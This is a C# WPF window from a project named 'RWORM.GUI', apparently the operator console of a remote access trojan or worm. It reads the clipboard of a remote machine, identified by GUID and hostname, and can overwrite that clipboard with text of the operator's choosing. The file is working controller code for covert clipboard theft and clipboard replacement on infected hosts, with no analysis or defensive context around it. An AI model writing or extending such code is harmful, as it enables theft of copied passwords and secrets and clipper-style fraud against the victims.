using System;
using System.Text;
using System.Windows;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class ClipboardManagerWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string _guid;

        public ClipboardManagerWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid = guid;
            Title = $"Clipboard Manager — {hostname}";
            TitleLabel.Text = hostname;

            _server.RegisterClipboardHandler(_guid, OnClipboardReceived);
            RequestClipboard();
        }

        protected override void OnClosed(EventArgs e)
        {
            _server.UnregisterClipboardHandler(_guid);
            base.OnClosed(e);
        }

        private void RequestClipboard()
        {
            StatusLabel.Text = "Fetching remote clipboard...";
            _ = _server.RequestClipboard(_guid);
        }

        private void OnClipboardReceived(byte[] data)
        {
            try
            {
                var text = Encoding.UTF8.GetString(data);
                Dispatcher.BeginInvoke(new Action(() =>
                {
                    ClipboardEditor.Text = text;
                    StatusLabel.Text = $"Clipboard updated ({text.Length} chars) — {DateTime.Now:HH:mm:ss}";
                }));
            }
            catch (Exception ex)
            {
                Dispatcher.BeginInvoke(new Action(() => StatusLabel.Text = $"Error: {ex.Message}"));
            }
        }

        private void GetClipboard_Click(object sender, RoutedEventArgs e) => RequestClipboard();

        private void SetClipboard_Click(object sender, RoutedEventArgs e)
        {
            var text = ClipboardEditor.Text ?? string.Empty;
            StatusLabel.Text = "Setting remote clipboard...";
            _ = _server.SetClipboard(_guid, text, resp =>
            {
                Dispatcher.BeginInvoke(new Action(() =>
                {
                    var msg = Encoding.UTF8.GetString(resp);
                    StatusLabel.Text = $"Remote clipboard set ({text.Length} chars): {msg}";
                }));
            });
        }

        private void Clear_Click(object sender, RoutedEventArgs e)
        {
            ClipboardEditor.Clear();
            StatusLabel.Text = "Editor cleared.";
        }
    }
}
